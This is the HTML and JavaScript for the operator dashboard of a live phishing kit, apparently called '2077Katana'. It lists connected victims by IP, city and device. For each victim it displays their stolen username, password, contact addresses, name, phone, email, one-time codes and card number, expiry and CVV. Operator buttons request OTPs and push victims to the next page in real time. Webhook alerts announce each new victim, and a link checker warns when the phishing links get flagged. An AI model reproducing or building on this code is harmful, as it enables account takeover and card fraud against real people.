<div id="workers_group_container">
    <div id="waiting_for_connections" class="row">
        <div class="col bg-white bg-opacity-5 text-center justify-content-center rounded-1 p-1 ps-2 pe-2">
            Waiting for connections ...
        </div>
    </div>
    <div style="display: none" id="page_workers_container" class="row workers_container">
        <div class="col">

            <div class="card mb-3">

                <div class="card-body">

                    <div class="d-flex fw-bold small mb-3">
                        <span class="flex-grow-1 text-warning"><group>Waiting ...</group> [ <x class="text-muted fw-light">Clients:</x> <total_clients class="text-primary">0</total_clients> ]</span>
                        <span class="text-inverse text-opacity-50 text-decoration-none"><i class="bi bi-lightning-charge-fill text-warning"></i></span>
                    </div>


                    <div class="table-responsive">
                        <table class="table table-striped table-hover table-borderless mb-2px small text-nowrap workers_container">
                            <tbody>
                            <tr id="waiting">
                                <td colspan="5" class="justify-content-center text-secondary"><i class="bi bi-hourglass-bottom me-1 text-secondary"></i>Waiting for connections ...</td>
                            </tr>
                            <tr style="display: none" id="page_worker_template" class="clickable">
                                <td class="w-250px">
                                    <span class="badge d-block bg-theme text-theme-900 rounded-0 pt-5px pb-5px fw-bold" style="min-height: 18px">
                                        <i class="text-black me-2 client_type"></i><client_type></client_type>
                                    </span>
                                </td>
                                <td class="w-25">
                                    <span class="d-flex align-items-center">
                                        <i id="status_indicator" class="bi bi-circle-fill fs-6px text-theme me-3"></i>
                                        <small>
                                            <span class="text-muted">
                                                <span class="text-uppercase">
                                                    ACTIVE PAGE &mdash; <b class="text-warning fw-bold"><current_page></current_page></b>
                                                </span>
                                                &nbsp;
                                                <bracket class="text-success">
                                                    [&nbsp;<active_since></active_since>&nbsp;<x class="text-muted">/</x>
                                                    <active_moment class="text-white fw-bold text-capitalize"></active_moment> ago~&nbsp;]
                                                </bracket>
                                            </span>
                                        </small>
                                    </span>
                                </td>
                                <td>
                                    <small>
                                        <span id="country_flag" class="me-2"></span><country class="text-uppercase fw-bold"></country>
                                        <ip_address class="ms-1 small fw-light text-success"></ip_address>
                                        &nbsp;<ip_location></ip_location>
                                    </small>
                                </td>
                                <td class="w-25">
                                    <small>
                                        <span id="interaction_wait" class="text-uppercase">waiting for interaction</span>
                                        <span id="interacting_user" style="display: none" class="text-uppercase text-theme fw-bold">
                                            <user>?</user> is interacting ...
                                        </span>
                                    </small>
                                </td>
                                <td class="w-25px">
                                    <small>
                                        <wait_interact>
                                            <div class="spinner-border spinner-border-sm text-muted me-2 mb-0 mt-0"></div>
                                        </wait_interact>
                                        <interacting style="display: none">
                                            <i class="bi bi-pc-display-horizontal text-primary"></i>
                                        </interacting>
                                    </small>
                                </td>
                            </tr>
                            </tbody>
                        </table>
                    </div>

                </div>


                <div class="card-arrow">
                    <div class="card-arrow-top-left"></div>
                    <div class="card-arrow-top-right"></div>
                    <div class="card-arrow-bottom-left"></div>
                    <div class="card-arrow-bottom-right"></div>
                </div>

            </div>

        </div>
    </div>
</div>


<script>
    // join socket groups
    let socket_connections_request = {
        fetch: '/api/socket_connections/fetch',
        update: '/api/socket_connections/update'
    }
    let
        socket_reconnected = false,
        socket_connected = false;
    let page_workers = {
        groups: [],
        page_workers_total: 0,
        clients: {},
        client_types: {
            IOS: 'bi-apple',
            ANDROID: 'bi-android2',
            WINDOWS: 'bi-windows',
            MAC: 'bi-command',
            LINUX: 'bi-robot',
            UNKNOWN: 'bi-question-square'
        },
        row_container: null,
        row_template: null,
        row_element: null,
        tr_template: null,
        tr_element: null,
        group_clients: {}
    }
    let user_session = {};
    // shared worker functions
    let
        current_interaction = 0,
        clearInteraction = null,
        workerAvailable = false,
        sendMessage = null,
        handleIncomingMessage = null;

    let
        showError = function (message='Executed failed', action='Commander') {
            Swal.fire({
                title: action,
                html: message,
                icon: 'error',
                showConfirmButton: false,
                showCancelButton: false,
                timer: 1000,
                allowOutsideClick: false,
            });
        },
        showSuccess = function (message='Executed successfully', action='Commander') {
            Swal.fire({
                title: action,
                html: message,
                icon: 'success',
                showConfirmButton: false,
                showCancelButton: false,
                timer: 1000,
                allowOutsideClick: false,
            });
        };

    let Toast = false;

    $(document).ready(function () {

        Toast = Swal.mixin({
            toast: true,
            position: "bottom-end",
            showConfirmButton: false,
            timer: 7000,
            timerProgressBar: true,
            didOpen: (toast) => {
                toast.onmouseenter = Swal.stopTimer;
                toast.onmouseleave = Swal.resumeTimer;
            }
        });

        // links checker
        function _linkCheck() {
            let checkLinks = setTimeout(function () {
                $.get('/api/links/check', function (response) {
                    if (typeof response !== "undefined") {
                        if (Object.entries(response).length >=1) {
                            $('linkCount').text(`${Object.entries(response).length} link${Object.entries(response).length > 1 ? 's' : ''} active`);
                            _linkCheck();
                        } else {
                            // alert
                            notifyUser(false, 'No active links, All links were possibly flagged! Please update dashboard settings.');
                            clearInterval(checkLinks);
                        }
                    }
                });
            }, 5000);
        }
        _linkCheck();
    });

    $.get('/sessions', function (response) {
        if (typeof response !== "undefined" && 'user' in response) {
            user_session = response;
        }
    });


    function logExec(func, interacting_id) {
        let
            modal = $(`.modal.id_${interacting_id}#workerInfo`),
            clientDetails = modal.find('div#client_details_pane:eq(0)'),
            logsContainer = modal.find('textarea#input_logs:eq(0)');

        let _Log = "";
        _Log += "[ Function Exec ]\n";
        _Log += `Executing: ${func} ...\n\n`;

        logsContainer.val(function(index, currentValue) {
            return _Log + currentValue;
        });
    }
    function requestOTP(worker_id, interacting_id) {
        try {
            if (sendMessage !== null && interacting_id !== 'nada') {
                sendMessage(JSON.stringify({
                    type: 'request_otp',
                    client_id: worker_id
                }));
                showSuccess();
                logExec('requestOTP', interacting_id);
            } else {
                showError('Interaction ID not yet acquired');
            }
        } catch (e) {
            showError(e);
        }
    }
    function showLoader(worker_id, interacting_id) {
        try {
            if (sendMessage !== null && interacting_id !== 'nada') {
                sendMessage(JSON.stringify({
                    type: 'show_loader',
                    client_id: worker_id
                }));
                showSuccess();
                logExec('showLoader', interacting_id);
            } else {
                showError('Interaction ID not yet acquired');
            }
        } catch (e) {
            showError(e);
        }
    }
    function nextPage(worker_id, interacting_id) {
        try {
            if (sendMessage !== null && interacting_id !== 'nada') {
                sendMessage(JSON.stringify({
                    type: 'next_page',
                    client_id: worker_id
                }));
                showSuccess();
                logExec('nextPage', interacting_id);
            } else {
                showError('Interaction ID not yet acquired');
            }
        } catch (e) {
            showError(e);
        }
    }

    function enableControls(key, infoContainer) {

        let
            worker = page_workers.clients[key],
            interacting_id = ('interacting' in worker ? worker.interacting.client_id : 'nada'),
            worker_id = worker.client_id;
        infoContainer.find('textarea#input_logs:eq(0)')
            .removeClass('busy');
        infoContainer.find('div.card#otpControls:eq(0)')
            .removeClass('busy');
        infoContainer.find('button#requestOtp:eq(0)')
            .removeClass('disabled')
            .removeClass('busy')
            .removeAttr('disabled')
            .attr('onclick', `requestOTP('${worker_id}', '${interacting_id}')`);
        infoContainer.find('button#showLoader:eq(0)')
            .removeClass('disabled')
            .removeClass('busy')
            .removeAttr('disabled')
            .attr('onclick', `showLoader('${worker_id}', '${interacting_id}')`);
        infoContainer.find('button#nextPage:eq(0)')
            .removeClass('disabled')
            .removeClass('busy')
            .removeAttr('disabled')
            .attr('onclick', `nextPage('${worker_id}', '${interacting_id}')`);
    }
    function disableControls(infoContainer) {
        infoContainer.find('textarea#input_logs:eq(0)')
            .addClass('busy');
        infoContainer.find('div.card#otpControls:eq(0)')
            .addClass('busy');
        infoContainer.find('button#requestOtp:eq(0)')
            .addClass('disabled')
            .addClass('busy')
            .attr('disabled', true)
            .removeAttr('onclick');
        infoContainer.find('button#showLoader:eq(0)')
            .addClass('disabled')
            .addClass('busy')
            .attr('disabled', true)
            .removeAttr('onclick');
        infoContainer.find('button#nextPage:eq(0)')
            .addClass('disabled')
            .addClass('busy')
            .attr('disabled', true)
            .removeAttr('onclick');
    }

    function updateModal(worker, key, force=false, offline=false) {

        let _update = function (worker) {
            let infoContainer = $(`.modal.id_${key}#workerInfo`);
            infoContainer.find('input[name=country]:eq(0)').val(worker.ip_info.country);
            infoContainer.find('input[name=ip_address]:eq(0)').val(worker.ip_info.query);

            let _idStatus = null;
            if (offline) {
                _idStatus = `<offline class="text-danger text-uppercase">offline</offline>`;
                infoContainer.find('input[name=current_page]:eq(0)')
                    .removeClass('text-theme')
                    .removeClass('border-theme')
                    .addClass('text-danger')
                    .val('unavailable');

                disableControls(infoContainer);
            } else {
                _idStatus = worker.key;
                infoContainer.find('input[name=current_page]:eq(0)')
                    .removeClass('text-danger')
                    .addClass('text-theme')
                    .addClass('border-theme')
                    .val(worker.current_page);

                if ((['login'].includes(worker.current_page)) && 'interacting' in worker) {
                    disableControls(infoContainer);
                } else {
                    enableControls(worker.key, infoContainer);
                }
            }
            infoContainer.find('span#client_worker_id:eq(0)').html(_idStatus);
            infoContainer.find('input[name=client_type]:eq(0)').val(worker.client_type);

            // fetch logs
            $.get(`/api/interaction_logs/${worker.key}`, function (response) {
                if ('logs' in response) {
                    let _input_logs = infoContainer.find('textarea#input_logs:eq(0)');
                    _input_logs.val('');
                    response.logs.forEach(function (log) {
                        _input_logs.val(function(index, currentValue) {
                            return log + currentValue;
                        });
                    });
                }
            }).done(function () {
                // fetch inputs
                // alert(JSON.stringify(worker));
                // alert(key);
                console.log(`Current key: ${key}`);
                $.get(`/api/input_logs/${worker.key}`, function (response) {
                    if ('attempts' in response) {
                        console.log(response);
                        Object.entries(response.attempts).forEach(([attempt_id, attempts]) => {
                            // show login details
                            if ('status' in attempts && attempts.status === 'validated') {

                                let
                                    _addresses = attempts.account.login.validated.address,
                                    _login = attempts.account.login;

                                infoContainer.find('input[name=username]:eq(0)').val(_login.username);
                                infoContainer.find('input[name=password]:eq(0)').val(_login.password);

                                if (_addresses.length === 1) {
                                    infoContainer.find('input[name=contact1]:eq(0)').val(_addresses[0]);
                                }
                                if (_addresses.length === 2) {
                                    infoContainer.find('input[name=contact2]:eq(0)').val(_addresses[1]);
                                }

                                let
                                    _web = (attempts.account.login.validated.portal.web ? '✔️' : '❌'),
                                    _mobile = (attempts.account.login.validated.portal.mobile ? '✔️' : '❌');
                                infoContainer.find('web_status:eq(0)').text(_web);
                                infoContainer.find('mobile_status:eq(0)').text(_mobile);
                            }

                            if ('account' in attempts && 'details' in attempts.account) {
                                let _details = attempts.account.details;
                                let fullName = _details.fname ? `${(_details.fname ?? '')} ${(_details.lname ?? '')}` : '';
                                infoContainer.find('input[name=fullName]:eq(0)').val(fullName);
                                infoContainer.find('input[name=cpNumber]:eq(0)').val(_details.phone);
                                infoContainer.find('input[name=email]:eq(0)').val(_details.email);
                            }

                            if ('otp_history' in attempts) {
                                Object.entries(attempts.otp_history).forEach(([date, pin]) => {
                                    infoContainer.find('input[name=otp]:eq(0)').val(pin.otp);
                                });
                            }

                            if ('account' in attempts && 'card' in attempts.account) {
                                let _card = attempts.account.card;
                                infoContainer.find('input[name=cardNumber]:eq(0)').val(_card.card);
                                infoContainer.find('input[name=cardExpiry]:eq(0)').val(_card.expiry);
                                infoContainer.find('input[name=cardCvv]:eq(0)').val(_card.cvv);
                            }


                        });
                    }
                });
            });

            // set current interaction key
            current_interaction = key;

        }
        if ($(`.modal.id_${key}#workerInfo`).is(':visible')) {
            _update(worker);
        }
        if (force) {
            _update(worker);
        }

        console.warn(worker);
    }

    function loadWorkerDetails(worker, client_idClass) {

        // process
        worker = JSON.parse(atob(worker));
        console.log(worker);
        // interact
        let interaction_id = 0;
        let _modalInfo = $(`.modal.id_${client_idClass}#workerInfo`);
        if (_modalInfo.length <= 0) {
            _modalInfo = $('.modal.template#workerInfo:eq(0)').clone();
            _modalInfo
                .removeClass('template')
                .addClass(`id_${client_idClass}`);

            _modalInfo.modal({
                backdrop: 'static',
                keyboard: false,
                show: false // Initialize the modal but don't show it immediately
            });
        }

        if (sendMessage !== null) {
            // fetch session
            if (typeof user_session !== "undefined" && 'user' in user_session) {

                interaction_id = page_workers.clients[worker.key].client_id;
                current_interaction = interaction_id;
                clearInteraction = function (interaction) {
                    current_interaction = 0;
                    sendMessage(JSON.stringify({
                        type: 'leave_worker',
                        id: interaction,
                        system_user: {
                            username: user_session.user.username,
                            id: user_session.user.id
                        }
                    }));
                };

                _modalInfo.off('hidden.bs.modal');
                _modalInfo.on('hidden.bs.modal', function () {
                    clearInteraction(interaction_id);
                });

                sendMessage(JSON.stringify({
                    type: 'interact_worker',
                    id: interaction_id,
                    system_user: {
                        username: user_session.user.username,
                        id: user_session.user.id
                    }
                }));

            } else {
                console.warn(`System User Session invalid`);
            }
        } else {
            console.warn(`Unable to send interact command, sendMessage function is not available`);
        }

        $('#loader').fadeIn('fast', function () {

            _modalInfo.off('shown.bs.modal');
            _modalInfo.on('shown.bs.modal', function () {
                _modalInfo.find('button#endInteraction:eq(0)').attr('onclick', `clearInteraction('${interaction_id}')`);

                // update modal
                updateModal(worker, client_idClass, true);
                let _details_pane = _modalInfo.find('div#client_details_pane:eq(0)');
                let _status_logs = _modalInfo.find('textarea#input_logs:eq(0)');
                console.log(`Hight: ${_status_logs.height()}px`);
                _status_logs.height(_details_pane.height()-195);
                // _status_logs.val('');
            });

            _modalInfo.modal('show');

            // setTimeout(function () {
            //     // update modal
            //     updateModal(worker, client_idClass, true);
            //     let _details_pane = _modalInfo.find('div#client_details_pane:eq(0)');
            //     let _status_logs = _modalInfo.find('textarea#input_logs:eq(0)');
            //     console.log(`Hight: ${_status_logs.height()}px`);
            //     _status_logs.height(_details_pane.height()-195);
            //     // _status_logs.val('');
            // }, 500, _modalInfo);

            $('#loader').fadeOut('slow');
        });
    }

    function renderWorkers(details) {

        let
            workers = details.page_workers,
            group_id =  ('group' in details ? CryptoJS.MD5(details.group).toString() : null);

        console.warn(`INFO *****`);
        console.warn(details);

        let _wait_connections = function (group_id) {
            if (group_id !== null) {
                let _group_element = $(`div.row#row_${group_id}:eq(0)`);
                if (_group_element.length >= 1) {
                    _group_element.find('table tbody tr#waiting:eq(0)').fadeIn('fast', function () {
                        // _group_element.append(page_workers.row_container);
                        _group_element.find('table tbody tr:not(tr#waiting)').each(function (i, element) {
                            if ($(element).is(':visible')) {
                                $(element).fadeOut();
                            }
                        });
                    });
                    _group_element.appendTo($('div#workers_group_container'));
                }
            }
        };

        // process page workers
        if (Object.entries(workers).length <= 0) {
            if (group_id in page_workers.group_clients && 'client_counts' in page_workers.group_clients[group_id]) {
                page_workers.group_clients[group_id]['client_counts'] = {};
            } else {
                // page_workers.groups.push(group_id);
                // page_workers.group_clients[group_id] = {
                //     client_counts: {},
                //     connections: 0,
                // };
                //
                // _group_element = page_workers.row_template.clone();
                // _group_element.attr('id', `row_${group_id}`);
                // _group_element.prependTo(page_workers.row_container);
                //
                // _group_element.find('.card-body group:eq(0)').text(details.group);
            }
            _wait_connections(group_id);
        } else {

            $(`div.row#row_${group_id}`).find('table tbody tr#waiting:eq(0)').fadeOut();
            Object.entries(workers).forEach(([client_id, worker]) => {

                if ('key' in worker) {
                    console.warn(`Processing worker: ${client_id}`);
                    console.warn(worker);

                    $('div#waiting_for_connections').fadeOut();

                    // check if group already exist or not
                    let
                        group = worker.group,
                        group_id = CryptoJS.MD5(worker.group).toString();

                    if (!(page_workers.groups.includes(group_id))) {
                        // add
                        page_workers.groups.push(group_id);
                        page_workers.group_clients[group_id] = {
                            client_counts: {},
                            connections: 0,
                        };

                        _group_element = page_workers.row_template.clone();
                        _group_element.attr('id', `row_${group_id}`);
                        _group_element.prependTo(page_workers.row_container);
                    } else {
                        _group_element = page_workers.row_container.find(`div.row#row_${group_id}`);
                    }

                    console.warn(_group_element);
                    _group_element.find('.card-body group:eq(0)').text(group);

                    console.log(client_id);
                    console.log(worker);

                    group_id = CryptoJS.MD5(worker.group).toString();

                    let _action = worker.action ?? false;
                    console.log(`Action: ${_action}`);


                    let _tr = _group_element.find(`tr#w_${worker.key}:eq(0)`);
                    if (_tr.length <= 0) {
                        // tr exist
                        _tr = page_workers.tr_template.clone();
                        _tr.attr('id', `w_${worker.key}`);
                        _tr.prependTo(_group_element.find('table tbody:eq(0)'));

                        notifyUser(worker);
                    }
                    console.warn(_group_element);
                    console.warn(_tr);

                    console.warn(`Worker: ${JSON.stringify(worker)}`);

                    switch (_action) {
                        case 'disconnect':
                            if ('key' in worker) {
                                console.warn(`Deleting: ${worker.key} ...`);
                                delete page_workers.group_clients[group_id]['client_counts'][`worker_${worker.key}`];
                            }

                            // update modal
                            if ('interacting' in worker) {
                                updateModal(worker, worker.interacting.client_id, false, true);
                            }

                            _tr
                                .removeAttr('onclick')
                                .removeClass('clickable')
                                .addClass('busy');
                            _tr.find('i#status_indicator')
                                .removeClass('text-theme')
                                .addClass('text-danger');
                            _tr.fadeOut('slow');

                            if (Object.entries(page_workers.group_clients[group_id]['client_counts']).length <= 0) {
                                _wait_connections(group_id);
                            }

                            break;

                        default:

                            if (!(_tr.is(':visible'))) {
                                _tr.fadeIn();
                            }

                            if ('page_workers' in worker && 'key' in worker) {
                                page_workers.group_clients[group_id]['client_counts'][`worker_${worker.key}`] = 'connected';
                            }

                            let
                                setOnclick = function () {
                                    console.warn(`Setting onClick Interaction`);
                                    _tr
                                        .addClass('clickable')
                                        .removeClass('busy')
                                        .attr('onclick', `loadWorkerDetails('${btoa(JSON.stringify(worker))}', '${client_id}')`);

                                },
                                noInteractions = function () {
                                    setOnclick();
                                    _tr
                                        .removeClass('busy')
                                        .addClass('clickable');
                                    _tr.find('i#status_indicator')
                                        .removeClass('text-muted')
                                        .removeClass('text-danger')
                                        .addClass('text-theme');

                                    _tr.find('span#interaction_wait:eq(0)').show();
                                    _tr.find('span#interacting_user:eq(0)').hide();
                                    _tr.find('wait_interact:eq(0)').show();
                                    _tr.find('interacting:eq(0)').hide();
                                    _tr.find('span#interacting_user user:eq(0)').text('?');

                                };

                            if ('interacting' in worker && 'username' in worker.interacting && 'id' in worker.interacting) {

                                console.warn(`Interacting page worker: ${client_id}`);
                                console.warn(worker);

                                _tr.find('span#interaction_wait:eq(0)').hide();
                                _tr.find('span#interacting_user:eq(0)').show();
                                _tr.find('wait_interact:eq(0)').hide();
                                _tr.find('interacting:eq(0)').show();

                                console.warn(`IDs: ${user_session.user.id} vs ${worker.interacting.id}`);

                                _tr
                                    .removeAttr('onclick')
                                    .removeClass('clickable')
                                    .addClass('busy');
                                _tr.find('i#status_indicator')
                                    .removeClass('text-muted')
                                    .removeClass('text-theme')
                                    .addClass('text-danger');

                                let _you = '';
                                if (worker.interacting.username === user_session.user.username) {
                                    _you = ' <small class="text-muted">(You)</small>';
                                    if (current_interaction === 0) {
                                        console.warn(`Current interaction: ${current_interaction}`);
                                        setOnclick();
                                    }
                                    // show unlock interaction
                                }
                                _tr.find('span#interacting_user user:eq(0)').html(`${worker.interacting.username}${_you}`);



                            } else {
                                noInteractions();
                            }

                            _tr.fadeIn('fast');
                            worker['client_id'] = client_id;
                            page_workers.clients[worker.key] = worker;
                            // render page worker

                            // update modal
                            console.warn(`Worker details`);
                            console.warn(worker);

                            if ('interacting' in worker && 'client_id' in worker.interacting) {
                                updateModal(worker, worker.interacting.client_id);
                            }


                            if (worker.current_page.toLowerCase() !== "login") {
                                _tr.find('current_page:eq(0)')
                                    .removeClass('text-muted')
                                    .addClass('text-primary')
                                    .text(worker.current_page);
                            } else {
                                _tr.find('current_page:eq(0)')
                                    .removeClass('text-primary')
                                    .addClass('text-muted')
                                    .text(worker.current_page);
                            }
                            _tr.find('active_since:eq(0)').text(worker.active_since);
                            _tr.find('active_moment:eq(0)').text(moment(worker.active_since, "YYYY-MM-DD HH:mm:ss").fromNow(true));
                            _tr.find('client_type:eq(0)').text(worker.client_type);
                            _tr.find('i.client_type:eq(0)').addClass(`bi ${page_workers.client_types[(worker.client_type !== '' ? worker.client_type : 'UNKNOWN')] ?? 'bi-hourglass-bottom'}`);
                            _tr.find('country:eq(0)').text(worker.ip_info.country);
                            _tr.find('ip_location:eq(0)').html(`<span class="text-muted">( ${worker.ip_info.regionName} / ${worker.ip_info.city} )</span>`);
                            _tr.find('ip_address:eq(0)').text(worker.ip_info.query);
                            //
                            _tr.find('span#country_flag:eq(0)')
                                .addClass(`fi fi-${(worker.ip_info.countryCode ?? 'xx').toLowerCase()}`);

                            _tr.prependTo(_group_element.find('table tbody:eq(0)'));
                            _group_element.prependTo($('div#workers_group_container'));

                            break;
                    }

                    // update connections hsitory
                    let _connections = page_workers.group_clients[group_id]['connections'];
                    let _clients = Object.entries(page_workers.group_clients[group_id]['client_counts']).length;
                    if (_clients > _connections) {
                        page_workers.group_clients[group_id]['connections']++;
                        _connections = page_workers.group_clients[group_id]['connections'];
                    }
                    // set total clients on group
                    _group_element.find('.card-body total_clients:eq(0)').text(`${_clients}/${_connections}`);
                }

            });

        }

    }

    function notifyUser(worker=false, message=false) {
        // alert(JSON.stringify(worker, null, 2));
        // send webhook alert
        let sendTTSMessage = function (customMessage, webhookUrl, _worker=false) {
            let tError = false;
            if (!customMessage) {
                tError = Swal.mixin({
                    toast: true,
                    position: "bottom-end",
                    showConfirmButton: false,
                    timer: 7000,
                    timerProgressBar: true,
                    didOpen: (toast) => {
                        toast.onmouseenter = Swal.stopTimer;
                        toast.onmouseleave = Swal.resumeTimer;
                    }
                });
                if (tError) {
                    tError.fire({
                        icon: "error",
                        title: "Please enter a message before sending."
                    });
                }
                return;
            }

            // Get current time
            const currentTime = new Date().toLocaleString();

            // The payload with content to send as TTS
            $.get('/sessions', function (response) {

                let _activeUser = `Current user: ${response.user.global_name}\n`;
                let payload = {};
                if (_worker) {
                    payload = {
                        content: `**${customMessage}**\n**Dashboard:** ${document.location.href} \n@everyone\`\`\`${_activeUser}Visitor Type: ${_worker.client_type}\nLocation: ${_worker.ip_info.city} ${_worker.ip_info.regionName}\nIP Address: ${_worker.ip_info.query}\nOrigin: ${_worker.group}\nTime: ${currentTime}\`\`\``,
                        tts: true
                    };
                } else {
                    payload = {
                        content: `**${customMessage}**\n@everyone @everyone @everyone`,
                        tts: true
                    };
                }
                // Send the POST request
                fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(payload)
                })
                    .then(response => {
                        if (response.ok) {
                            if (tError) {
                                tError.fire({
                                    icon: "success",
                                    title: "Alert sent successfully!"
                                });
                            }
                        } else {
                            if (tError) {
                                tError.fire({
                                    icon: "error",
                                    title: "Failed to send TTS message. Check console for details."
                                });
                            }
                        }
                    })
                    .catch(error => {
                        if (tError) {
                            tError.fire({
                                icon: "error",
                                title: "An error occurred. Check console for details."
                            });
                        }
                    });
            });
        }

        $.get('/api/fetch_hooks', function (response) {
            if (typeof response !== "undefined" && 'list' in response) {
                Object.entries(response.list).forEach(function ([x, hook]) {
                    if (message) {
                        sendTTSMessage(message, hook, worker);
                    } else {
                        sendTTSMessage(`A new visitor connection was established!`, hook, worker);
                    }
                });
            }
        });

        if (worker && !(message)) {
            if (Toast !== false) {
                Toast.fire({
                    icon: "info",
                    title: "New connection"
                });
            }

            // set alarm
            const audioUrl = '/public/assets/audio/alert.mp3';
            let playAudio = function() {
                const audio = new Audio(audioUrl);
                audio.addEventListener('canplaythrough', () => {
                    console.log('Audio can play through, attempting to start...');
                    // Attempt to play the audio
                    const playPromise = audio.play();
                    // Handle the play event and catching autoplay errors
                    if (playPromise !== undefined) {
                        playPromise.then(() => {
                            console.warn('Audio is playing...');
                        }).catch(error => {
                            console.warn('Autoplay failed. Please play manually.');
                            console.error('Autoplay was prevented:', error);
                        });
                    }
                });
                // Optional: Handling on error events
                audio.addEventListener('error', () => {
                    console.error('Error loading audio.');
                });
            };
            // Run the function
            playAudio();
        }
    }

    function displayWorkers(details) {

        try {

            // grab row container element
            if (page_workers.row_container === null) {
                page_workers.row_container = $('div#workers_group_container:eq(0)');
            }

            // clone templates
            if (page_workers.row_template === null) {
                if (page_workers.row_element === null) {
                    page_workers.row_element = $('div.row.workers_container#page_workers_container').clone();
                    page_workers.row_element
                        .removeAttr('id')
                        .removeAttr('style');
                }
                page_workers.row_template = page_workers.row_element;
                page_workers.row_template
                    .removeAttr('id')
                    .removeClass('workers_container');
            }
            if (page_workers.tr_template === null) {
                if (page_workers.tr_element === null) {
                    page_workers.tr_element = page_workers.row_template.find('tr#page_worker_template:eq(0)').clone();
                }
                page_workers.tr_template = page_workers.tr_element;
                page_workers.tr_template
                    .removeAttr('id')
                    .removeAttr('style');
            }

            // add row
            renderWorkers(details);

        } catch (e) {
            console.log(`Error: ${e}`);
        }
    }

    if (window.SharedWorker) {
        workerAvailable = true;
        const worker = new SharedWorker('/public/assets/js/socket/worker.js');

        worker.port.start();

        // Handle incoming messages from the SharedWorker
        worker.port.onmessage = function(event) {
            const { status, type, data, error, client_info } = event.data;
            if (status) {
                console.log('Status:', status);
                switch (status) {
                    case 'Error':
                        console.log('Error:', error);
                        break;
                }
            } else if (type === 'message') {
                handleIncomingMessage(data);
            }
        };

        // Function to send messages to the SharedWorker
        sendMessage = function(data) {
            worker.port.postMessage({ command: 'send', data });
        }

        // Function to handle messages received from the SharedWorker
        handleIncomingMessage = function(data) {
            try {
                const parsedData = JSON.parse(data);
                console.log('Received:', parsedData);


                let _joinGroups = function () {
                    // fetch group list & join
                    $.get(socket_connections_request.fetch, function (response) {
                        if (typeof response !== "undefined" && 'lists' in response) {
                            // join socket groups and fetch page_workers
                            response.lists.filter(function (socket_group) {
                                sendMessage(JSON.stringify({
                                    type: 'join_group',
                                    group: socket_group
                                }));
                            });
                        }
                    });
                };
                if ('type' in parsedData) {
                    switch (parsedData.type) {
                        case 'interaction_updates':
                            console.warn(`interaction_updates: ${data}`);
                            if ('client_id' in parsedData && 'logs' in parsedData && $(`.modal.id_${parsedData.client_id}#workerInfo`).length >= 1) {
                                let
                                    modal = $(`.modal.id_${parsedData.client_id}#workerInfo`),
                                    clientDetails = modal.find('div#client_details_pane:eq(0)'),
                                    logsContainer = modal.find('textarea#input_logs:eq(0)');

                                logsContainer.val(function(index, currentValue) {
                                    return parsedData.logs + currentValue;
                                });

                                switch (parsedData.case) {
                                    case 'LOGIN_VALID':
                                        if ('data' in parsedData) {

                                            clientDetails.find('input[name=username]:eq(0)').val(parsedData.data.user.username);
                                            clientDetails.find('input[name=password]:eq(0)').val(parsedData.data.user.password);

                                            let addresses = parsedData.data.address;
                                            if (addresses.length === 1) {
                                                clientDetails.find('input[name=contact1]:eq(0)').val(parsedData.data.address[0]);
                                            }
                                            if (addresses.length === 2) {
                                                clientDetails.find('input[name=contact2]:eq(0)').val(parsedData.data.address[1]);
                                            }

                                            clientDetails.find('web_status:eq(0)').text((parsedData.data.portal.web ? '✔️' : '❌'));
                                            clientDetails.find('mobile_status:eq(0)').text((parsedData.data.portal.mobile ? '✔️' : '❌'));

                                        }
                                        break;

                                    case 'OTP':
                                        if ('data' in parsedData) {
                                            clientDetails.find('input[name=otp]:eq(0)').val(parsedData.data.otp);
                                        }
                                        break;

                                    case 'DETAILS':
                                        if ('data' in parsedData) {
                                            clientDetails.find('input[name=fullName]:eq(0)').val(`${parsedData.data.fname} ${parsedData.data.lname}`);
                                            clientDetails.find('input[name=cpNumber]:eq(0)').val(parsedData.data.phone);
                                            clientDetails.find('input[name=email]:eq(0)').val(parsedData.data.email);
                                        }
                                        break;

                                    case 'CARD':
                                        if ('data' in parsedData) {
                                            clientDetails.find('input[name=cardNumber]:eq(0)').val(parsedData.data.card);
                                            clientDetails.find('input[name=cardExpiry]:eq(0)').val(parsedData.data.expiry);
                                            clientDetails.find('input[name=cardCvv]:eq(0)').val(parsedData.data.cvv);
                                        }
                                        break;


                                }
                            }
                            break;

                        case 'end_interactions':
                            if ('key' in parsedData) {
                                if ($(`.modal.id_${parsedData.key}#workerInfo`).is(':visible')) {
                                    $(`.modal.id_${parsedData.key}#workerInfo`).modal('hide');
                                }
                            }
                            break;

                        case 'socket_connected':
                            socket_connected = true;
                            break;
                        case 'socket_disconnected':
                        case 'socket_error':
                            socket_reconnected = false;
                            socket_connected = false;
                            break;

                        case 'connection':
                            if (!(socket_reconnected)) {
                                socket_reconnected = true;
                            }

                            console.warn('Joining groups and updating worker status');
                            _joinGroups();

                            // reconnect interaction
                            if (current_interaction !== 0 && sendMessage !== null && typeof user_session !== "undefined" && 'user' in user_session) {
                                sendMessage(JSON.stringify({
                                    type: 'interact_worker',
                                    id: current_interaction,
                                    system_user: {
                                        username: user_session.user.username,
                                        id: user_session.user.id
                                    }
                                }));
                            }
                            break;

                        case 'page_workers':
                            if (typeof data !== "undefined" && 'details' in parsedData) {
                                // display page workers by group
                                displayWorkers(parsedData.details);
                            }
                            break;

                        case 'dashboard_client':
                            let _info = localStorage.getItem('info');
                            console.warn(`Info: ${_info}`);
                            console.warn(parsedData.info);
                            localStorage.setItem('info', JSON.stringify(parsedData.info));

                            _joinGroups();
                            break;
                    }
                }
                // Here you might update the UI or take other actions
            } catch (err) {
                console.error('Failed to parse message:', err, data);
            }
        }

        // Ensure the WebSocket closes cleanly when the page unloads
        window.addEventListener('beforeunload', () => {
            // worker.port.postMessage({ command: 'close' });
            if (clearInteraction !== null && current_interaction !== 0) {
                clearInteraction(current_interaction);
            }
        });

        // Example of sending a message
        sendMessage(JSON.stringify({
            type: 'connected!',

        }));

        console.log('2077Katana initialized');
    } else {
        workerAvailable = false;
        console.error('SharedWorker is not supported in this browser.');
    }

</script>